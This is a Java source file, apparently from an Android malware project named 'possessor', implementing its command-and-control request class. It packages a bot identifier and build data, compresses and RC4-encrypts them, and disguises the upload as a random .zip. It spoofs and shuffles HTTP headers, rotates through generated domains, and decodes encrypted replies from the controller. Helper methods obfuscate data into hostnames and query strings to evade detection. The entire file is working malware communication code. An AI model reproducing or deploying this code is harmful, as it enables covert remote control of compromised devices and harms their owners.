package com.zer0.possessor;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.Random;

public class ZCtrlRequest
{
	private static final int HEADERS_COUNT = 6;

	private ZRuntime _zRuntime;
	private Controller _ctrl;
	private Random _random;
    private int _requestHash;
	public ZOutputStream _requestStream;
	private ZInputStream _responseStream;
	private Reflect _owner;

	ZCtrlRequest(ZRuntime zRuntime)
	{
		_zRuntime = zRuntime;
		_ctrl = (Controller)_zRuntime.getController();
	}
	
	public void init(int requestHash)
	{
		_responseStream = null;

		_requestHash = requestHash;
		_random = new Random();
		_requestStream = new ZOutputStream();
		_requestStream.writeInt(_requestHash);
		_requestStream.writeInt(_zRuntime.getBuildId());
		_requestStream.writeInt(_zRuntime.getSubId());
		_requestStream.writeInt(_zRuntime.getPlatformId());
		_requestStream.writeInt(_zRuntime.getCoreVersion());
		_requestStream.writeBinaryString(_zRuntime.getUniqId());
	}
	
	public ZOutputStream getRequestStream()
	{
		return _requestStream;
	}
	
	public ZInputStream getResponseStream()
	{
		return _responseStream;
	}
	
	public ZInputStream doRequest() throws IOException
	{
		int i;
		int[] indexes = new int[ZCtrlRequest.HEADERS_COUNT];
		HashMap<String, String> parameters = new HashMap<>();
		
		// finish stream
		long crc = CRC64.checksum(_requestStream.toByteArray());
		_requestStream.writeLong(crc);
		
		com.zer0.possessor.lzma.lzma.Encoder encoder = new com.zer0.possessor.lzma.lzma.Encoder();
        encoder.SetDictionarySize(131072);

        byte[] inBuffer = _requestStream.toByteArray();
		int origSize = inBuffer.length;
		ByteArrayInputStream baIs = new ByteArrayInputStream(inBuffer);
		ByteArrayOutputStream baOs = new ByteArrayOutputStream(0);
		encoder.WriteCoderProperties(baOs);
		encoder.Code(baIs, baOs, inBuffer.length, -1);
        byte[] mBuffer = Arc4.encrypt(baOs.toByteArray(), ZTable.buffer);
		
		for (i = 0; i < ZCtrlRequest.HEADERS_COUNT; ++i) {
	        indexes[i] = i;
	    }
		
		for (i = 0; i < (HEADERS_COUNT << 1); ++i) {
	        int index1, index2, temp;
	        do {
	            index1 = _random.nextInt(HEADERS_COUNT);
	            index2 = _random.nextInt(HEADERS_COUNT);
	        } while (index1 == index2);

	        temp = indexes[index1];
	        indexes[index1] = indexes[index2];
	        indexes[index2] = temp;
	    }

		SimpleMultipartEntity multiEntity = new SimpleMultipartEntity();
		ByteArrayInputStream fin = new ByteArrayInputStream(mBuffer);
		multiEntity.addPart(StringUtils.randomString(3, true), StringUtils.randomString(7 + _random.nextInt(15), false) + ".zip", fin, "application/octet-stream", true);

        String sid = StringUtils.toHexString(_requestHash & 0xFFFFFFFFL, 8);
        sid += StringUtils.toHexString(origSize & 0xFFFFFFFFL, 8);
        sid += StringUtils.toHexString(_zRuntime.getBuildId() & 0xFFFFFFFFL, 8);
        sid += StringUtils.toHexString(_zRuntime.getSubId() & 0xFFFFFFFFL, 8);

		for (i = 0; i < HEADERS_COUNT; ++i) {
	        switch (indexes[i]) {
	            case 0: {
	                parameters.put("Cookie", "sid=" + sid);
	                break;
	            }
	            case 1: {
	            	parameters.put("Accept", "*/*"); // "text/html,application/xhtml+xml,application/xml,*/*"
	                break;
	            }
	            case 2: {
	            	parameters.put("Host", StringUtils.randomString(3 + _random.nextInt(8), true) + "." + StringUtils.randomString(3 + _random.nextInt(8), true) + "." + _ctrl.getRootZone(_random.nextInt(10)));
	                break;
	            }
	            case 3: {
	            	parameters.put("User-Agent", System.getProperty("http.agent"));
	                break;
	            }
	            case 4: {
	            	parameters.put("Connection", "close");
	                break;
	            }
	            case 5: {
	            	parameters.put("Content-Type", multiEntity.getContentType());
	            }
	        }
	    }
		
		boolean repeatRequest = true;
		_ctrl.generateNames();
		while (repeatRequest) {
            HttpURLConnection conn = null;
            try {
				URL url = new URL(_ctrl.getFullUrl(80));
                //URL url = new URL("http://192.168.137.7:8080/");
				conn = (HttpURLConnection)url.openConnection();
				conn.setReadTimeout(80000);
				conn.setConnectTimeout(60000);
				conn.setRequestMethod("POST");
				for (Map.Entry<String, String> entry : parameters.entrySet()) {
					conn.setRequestProperty(entry.getKey(), entry.getValue());
				}
				conn.setFixedLengthStreamingMode((int)multiEntity.getContentLength());
				conn.setInstanceFollowRedirects(false);
				conn.setUseCaches(false);
				conn.setDoInput(true);
				conn.setDoOutput(true);
				
				OutputStream os = conn.getOutputStream();
				multiEntity.writeTo(os);

				if (conn.getResponseCode() == 200 && conn.getHeaderField("Content-Type").equals("application/octet-stream")) {
					DataInputStream dis = new DataInputStream(conn.getInputStream());
					ByteArrayOutputStream dos = new ByteArrayOutputStream();
					
					int flags = 0;
 					for (i = 0; i < 4; i++) {
						int v = dis.read();
						if (v < 0) {
							throw new IOException(""/*"Can't read flags"*/);
						}
						flags |= v << (8 * i);
					}
					int outSize = flags & 0x3FFFFFFF;

					FileUtils.copyStream(dis, dos);
					
					byte[] data = dos.toByteArray();			
					
					if ((flags & 0x40000000) != 0) {
						//  decrypt
						data = Arc4.encrypt(data, ZTable.buffer);
					}

					if ((flags & 0x80000000) != 0) {
						// decompress
						ByteArrayInputStream tis = new ByteArrayInputStream(data);
						ByteArrayOutputStream tos = new ByteArrayOutputStream(0);

						int propertiesSize = 5;
						byte[] properties = new byte[propertiesSize];
						if (tis.read(properties, 0, propertiesSize) != propertiesSize) {
							throw new IOException(""/*"Received data too small"*/);
						}
						com.zer0.possessor.lzma.lzma.Decoder decoder = new com.zer0.possessor.lzma.lzma.Decoder();
						if (!decoder.SetDecoderProperties(properties)) {
							throw new IOException(""/*"Incorrect lzma properties"*/);
						}
						if (!decoder.Code(tis, tos, outSize)) {
							throw new IOException(""/*"Cannot decompress received data"*/);
						}
						decoder = null;
						data = tos.toByteArray();
					}

					_responseStream = new ZInputStream();
					_responseStream.init(new ByteArrayInputStream(data));
					break;
				}
				else {
					Thread.sleep(300);
					repeatRequest = _ctrl.iterateDomainIndex();
				}
			}
			catch (Exception e) {
                e.printStackTrace();
				try {
					Thread.sleep(300);
				}
				catch (InterruptedException ee) {
                    e.printStackTrace();
				}
				repeatRequest = _ctrl.iterateDomainIndex();
			}
            finally {
                if (conn != null) {
                    conn.disconnect();
                }
            }
        }
		return _responseStream;
	}
	
	private String decomposeIntoParams(String str, String params)
	{
	    int strLen = str.length();
	    int paramSize = 2 + (_random.nextInt(strLen / 2));
	    int paramNameSize = _random.nextInt(paramSize);

	    if (paramNameSize == 0) {
	        paramNameSize = 1;
	    }

	    if (params.length() > 0) {
	        params += "&";
	    }

	    
	    params += str.substring(0, paramNameSize);
	    params += "=";
	    params += str.substring(paramNameSize, paramSize);

	    String strRemain = str.substring(paramSize, str.length());
	    if (strRemain.length() < 4) {
	        params += strRemain;
	        return params;
	    }

	    return decomposeIntoParams(strRemain, params);
	}

	private String obfuscateDataAsGetParams(String data)
	{
	    int dummyNum = 3 + _random.nextInt(5);
	    String obfId = "";
	    String params = "";

	    obfId += (char)('a' + dummyNum);
	    for (int i = 0; i < data.length(); ++i) {
	        int k;
	        obfId += data.charAt(i);
	        for (k = 0; k < dummyNum; ++k) {
	            if (_random.nextInt(2) != 0) {
	            	obfId += (char)('0' + _random.nextInt(10));
	            }
	            else {
	            	obfId += (char)('a' + _random.nextInt(26));
	            }
	        }
	    }

	    return decomposeIntoParams(obfId, params);
	}

	private String obfuscateData(String data)
	{
	    int i, len = data.length();
	    String obfData = "";
	    final String symTable = "01234abcdefghijklmnopqrstuvwxyz56789";

	    for (i = 0; i < len; ++i) {
	        int rndOffset = _random.nextInt(21);
	        obfData += (char)(97 + rndOffset);
			int chCode = (int)data.charAt(i);
	        obfData += symTable.charAt((chCode & 0x0F) + rndOffset);
			chCode /= 16;
	        obfData += symTable.charAt((chCode & 0x0F) + rndOffset);
	    }
	    return obfData;
	}

	private String obfuscateIntoHost(String data)
	{
		String obfData = obfuscateData(data);
	    String domain;
	    int obfDataLen = obfData.length();

	    int domain3Num = 3 + _random.nextInt((obfDataLen / 2) - 2);

	    domain = obfData.substring(0, domain3Num);
	    domain += ".";
	    domain += obfData.substring(domain3Num);
        domain += ".";
	    domain += _ctrl.getRootZone(_random.nextInt(10));
	    return domain;
	}
	
	public void setModuleOwner(Object owner)
	{
		_owner = Reflect.on(owner);
	}

	public Reflect getModuleOwner()
	{
		return _owner;
	}
	
	public int getRequestHash()
	{
		return _requestHash;
	}
}
